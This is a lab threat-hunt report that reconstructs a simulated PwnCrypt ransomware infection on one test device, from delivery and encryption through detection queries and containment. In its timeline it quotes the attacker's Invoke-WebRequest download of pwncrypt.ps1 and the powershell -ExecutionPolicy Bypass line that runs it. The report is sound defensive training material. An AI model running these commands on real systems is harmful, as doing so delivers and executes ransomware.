#  Attack Timeline Reconstruction

**Device:** `saranpc2`  
**Hunt Date:** March 28, 2026  
**Analyst:** Saran  
**Ransomware Strain:** PwnCrypt

---

## Timeline of Events

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[PRE-INCIDENT — ENVIRONMENT STATE]
    📌 CONTEXT: Immature Security Posture
    ─────────────────────────────────────────────────────────────────
    The organisation's security programme has significant gaps:
    
    ┌────────────────────────────────────────────────────────────┐
    │ • No user awareness training — phishing risk is HIGH        │
    │ • PowerShell unrestricted — no execution policy enforced    │
    │ • No Script Block Logging — script content invisible        │
    │ • No application allowlisting — any .ps1 can run           │
    │ • No ransomware extension monitoring alerts                 │
    │ • Backups — status unknown at time of incident             │
    └────────────────────────────────────────────────────────────┘
    
    Status: Organisation is highly susceptible to ransomware attack

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T — THREAT INTELLIGENCE: PwnCrypt Reported in News]
    📌 CONTEXT: CISO Directive Issued
    ─────────────────────────────────────────────────────────────────
    News reports emerge of a new ransomware strain — PwnCrypt.
    
    Known characteristics published:
    • Payload: PowerShell-based (pwncrypt.ps1)
    • Encryption: AES-256
    • Target: C:\Users\Public\Desktop and user directories
    • IoC: .pwncrypt file extension (e.g., hello.txt → hello.pwncrypt.txt)
    • Ransom note: decryption-instructions.txt
    
    CISO directive: investigate whether PwnCrypt has reached
    the corporate network.
    
    → Threat hunt initiated using known IoC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T — DELIVERY (Method inferred — not directly observed)]
    📌 EVENT: pwncrypt.ps1 Delivered to saranpc2
    ─────────────────────────────────────────────────────────────────
    Likely delivery method: Phishing (T1566) — not directly confirmed
    in MDE logs. Most probable scenario: user clicked a malicious
    link or opened an infected attachment which triggered the download.
    
    Script downloaded via:
    Invoke-WebRequest -Uri '[GitHub URL]/pwncrypt.ps1'
    -OutFile 'C:\ProgramData\pwncrypt.ps1'
    
    Script lands at: C:\ProgramData\pwncrypt.ps1
    
    Source: DeviceFileEvents (FileCreated — pwncrypt.ps1 in C:\ProgramData\)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-28T07:14:47.6594518Z — EXECUTION BEGINS]
    📌 EVENT: PwnCrypt Ransomware Executes
    ─────────────────────────────────────────────────────────────────
    The ransomware payload is triggered via:
    
    cmd.exe → powershell.exe -ExecutionPolicy Bypass
               -File C:\ProgramData\pwncrypt.ps1
    
    Key indicators:
    • cmd.exe as parent process — staging pattern (T1059.003)
    • -ExecutionPolicy Bypass — deliberate security bypass (T1059.001)
    • C:\ProgramData\ — writable without elevation
    • pwncrypt.ps1 — ransomware payload begins execution
    
    Source: DeviceProcessEvents

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-28T07:14:47Z → T+MINUTES — ENCRYPTION PHASE]
    📌 EVENT: File Encryption Begins — AES-256
    ─────────────────────────────────────────────────────────────────
    pwncrypt.ps1 begins encrypting files across target directories.
    
    Encryption workflow observed:
    ┌────────────────────────────────────────────────────────────┐
    │ Step 1: Enumerate target files                             │
    │ Step 2: Encrypt file content with AES-256                  │
    │ Step 3: FileCreated — write encrypted copy (.pwncrypt.ext) │
    │ Step 4: FileRenamed — rename original to .pwncrypt variant │
    │ Step 5: Stage encrypted files in C:\Windows\Temp           │
    │ Step 6: Move/rename files to Desktop (victim visibility)   │
    └────────────────────────────────────────────────────────────┘
    
    Confirmed encrypted file: 9165_CompanyFinancials_pwncrypt.csv
    
    Source: DeviceFileEvents (FileCreated + FileRenamed events)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T+MINUTES — RANSOM NOTE DELIVERY]
    📌 EVENT: decryption-instructions.txt Dropped to Desktop
    ─────────────────────────────────────────────────────────────────
    After completing encryption, pwncrypt.ps1 drops the ransom note:
    
    File: decryption-instructions.txt
    Location: C:\Users\labuser\Desktop
    
    Content: Payment instructions, threat of permanent data loss,
             deadline for payment (inferred — typical ransomware pattern)
    
    Source: DeviceFileEvents (FileCreated — decryption-instructions.txt)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T+MINUTES — USER IMPACT CONFIRMED]
    📌 EVENT: User Interacts with Encrypted Files and Ransom Note
    ─────────────────────────────────────────────────────────────────
    MDE process events confirm user interaction:
    
    notepad.exe opens: 9165_CompanyFinancials_pwncrypt.csv
    → User attempts to open encrypted company financial data
    → Sees garbled/encrypted content — realises file is inaccessible
    
    notepad.exe opens: decryption-instructions.txt
    → User reads the ransom note
    → User is now aware of the compromise
    
    OpenWith.exe: Additional interaction with encrypted files
    
    IMPACT PHASE COMPLETE — Ransomware has achieved its goal
    
    Source: DeviceProcessEvents (notepad.exe, OpenWith.exe)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-28 — HUNT INITIATED]
    📌 EVENT: IoC-Based Threat Hunt Begins
    ─────────────────────────────────────────────────────────────────
    Security team initiates hunt using known PwnCrypt IoC:
    ".pwncrypt" filename pattern
    
    Query 1: DeviceFileEvents | where FileName contains "pwncrypt"
    → IMMEDIATE HIT on saranpc2 — infection confirmed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-28 — PROCESS PIVOT]
    📌 ANALYSIS: Full Attack Chain Reconstructed
    ─────────────────────────────────────────────────────────────────
    Query 2: DeviceProcessEvents ±3 minutes of 07:14:47Z
    
    ✅ cmd.exe → powershell.exe -ExecutionPolicy Bypass confirmed
    ✅ pwncrypt.ps1 identified as ransomware payload
    ✅ notepad.exe opening ransom note — user impact confirmed
    ✅ Full kill chain reconstructed from delivery to impact

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-28 — CONTAINMENT]
    📌 ACTION: Device Isolated via MDE
    ─────────────────────────────────────────────────────────────────
    saranpc2 isolated from network via MDE.
    Ransomware activity stopped.
    Malicious processes terminated.
    Full EDR scan initiated.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-28 — VERDICT]
    📌 CONCLUSION: Active Ransomware Confirmed — Rebuild Initiated
    ─────────────────────────────────────────────────────────────────
    ✅ PwnCrypt ransomware confirmed on saranpc2
    ✅ AES-256 encryption applied to files — including company financials
    ✅ Ransom note delivered and read by user
    ✅ Full attack chain reconstructed (delivery → execution → encryption → impact)
    ✅ Device isolated — contained
    ✅ Credentials reset
    🔲 File restoration from backup — in progress
    🔲 Device rebuild — initiated

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## What Made This Attack Successful

| Factor | Attacker Advantage |
|---|---|
| No user training | User likely clicked phishing link without hesitation |
| Unrestricted PowerShell | Payload executed without any policy barrier |
| No Script Block Logging | Execution went undetected in real time |
| No ransomware extension alert | `.pwncrypt` files created without triggering any alert |
| Legitimate tools used | `powershell.exe` and `notepad.exe` are trusted — no AV alert |
| AES-256 encryption | Files unrecoverable without attacker's key |

---

## Key Evidence Reference

| Evidence | Timestamp | Source |
|---|---|---|
| `pwncrypt.ps1` delivered to `C:\ProgramData\` | Pre `07:14:47Z` | `DeviceFileEvents` |
| `cmd.exe` → `powershell.exe -ExecutionPolicy Bypass` | `07:14:47.659Z` | `DeviceProcessEvents` |
| First `.pwncrypt` file created | `07:14:47.659Z` | `DeviceFileEvents` |
| `9165_CompanyFinancials_pwncrypt.csv` encrypted | During encryption phase | `DeviceFileEvents` |
| Files staged in `C:\Windows\Temp` | During encryption phase | `DeviceFileEvents` |
| `decryption-instructions.txt` dropped to Desktop | Post-encryption | `DeviceFileEvents` |
| `notepad.exe` opens ransom note | Post-encryption | `DeviceProcessEvents` |
| Device isolated via MDE | `2026-03-28` | MDE Portal |

---

*Timeline reconstructed by: Saran | CyberRange Lab | March 28, 2026*
